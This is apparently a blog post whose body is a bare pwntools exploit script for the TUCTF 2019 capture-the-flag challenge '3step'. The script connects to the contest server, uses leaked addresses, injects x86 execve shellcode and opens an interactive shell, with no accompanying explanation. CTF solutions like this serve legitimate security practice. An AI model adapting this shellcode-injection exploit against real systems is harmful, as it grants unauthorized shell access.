+++
title = "TUCTF 2019 Pwnable 3step"
subtitle = "3step"

# Add a summary to display on homepage (optional).
summary = "3step"

date = "2019-12-03T03:33:19+09:00"
publishDate = "2019-12-03T03:33:19+09:00"
expiryDate = ""

# Authors. Comma separated list, e.g. `["Bob Smith", "David Jones"]`.
authors = []

# Tags and categories
# For example, use `tags = []` for no tags, or the form `tags = ["A Tag", "Another Tag"]` for one or more tags.
tags = []
categories = []
keywords = []

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["deep-learning"]` references 
#   `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
# projects = ["internal-project"]

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder. 
[image]
  # Caption (optional)
  caption = ""

  # Focal point (optional)
  # Options: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight
  focal_point = ""

draft = false
+++

```py
from pwn import *

def start():
    e = ELF('./3step')
    r = remote('chal.tuctf.com', 30504)

    return e, r

def info():
    r.recvuntil('0x')
    bss = int(r.recvline(), 16)
    stack = int(r.recvline(), 16)
    log.info(hex(bss) + ' bss')
    log.info(hex(stack) + ' stack')

    return bss, stack

def step1():
    r.recvuntil(': ')
    r.send('/bin/sh')

def step2():
    r.recvuntil(': ')
    r.send(shellcode)

def step3():
    r.recvuntil(': ')
    r.send(p32(stack))

if __name__ == '__main__':
    e, r = start()
    bss, stack = info()

    shellcode = '''
        mov ebx, {}
        xor ecx, ecx
        xor edx, edx
        xor eax, eax
        mov al, 0xb
        int 0x80
        mov al, 0xb
        int 0x80
    '''.format(bss)
    shellcode = asm(shellcode)

    step1()
    step2()
    step3()

    r.interactive()
```
